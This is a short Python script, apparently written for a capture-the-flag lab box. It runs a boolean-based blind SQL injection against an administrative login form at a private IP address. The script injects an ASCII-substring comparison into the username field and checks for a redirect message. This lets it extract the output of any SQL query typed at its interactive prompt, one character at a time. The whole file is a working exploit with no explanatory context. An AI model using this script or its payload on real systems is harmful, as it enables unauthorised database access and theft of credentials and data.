import requests

OKMsg = ["Redirecting you to the dashboard"]
FailedMsg = None
Req_url = "http://10.129.74.11/administrative"

def request_http(sql,index,guesschar):
    http_header = {
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests":"1",
        "Origin": "http://10.129.74.11",
        "Content-Type": "application/x-www-form-urlencoded",
        "Connection": "close"
    }
    post_data = "uname=admin' and ascii(substr((%s),%s,1)) = %s  -- -&password=admin" % (sql,index,guesschar)
    return_txt = requests.post(Req_url,headers=http_header,data=post_data).text

    if (FailedMsg):
        for fail in FailedMsg:
            if (fail in return_txt):
                return False

    for okmsg in OKMsg:
        if (okmsg in return_txt):
            return True

    return False

def query_sql(sql):
    guessed_str  = ""
    for index in range(1,100):
        founded = False

        # Guess str 
        for x in range(0,128):
            if request_http(sql,index,x) :
                guessed_str +=chr(x)
                founded = True
                if (x == 0):
                    founded = False
                print(guessed_str)
                continue

        if not founded:
            print("---------------------- Return --------------------")
            print(guessed_str)
            print("--------------------------------------------------")
            break
while True:
    query_sql(input("$ "))
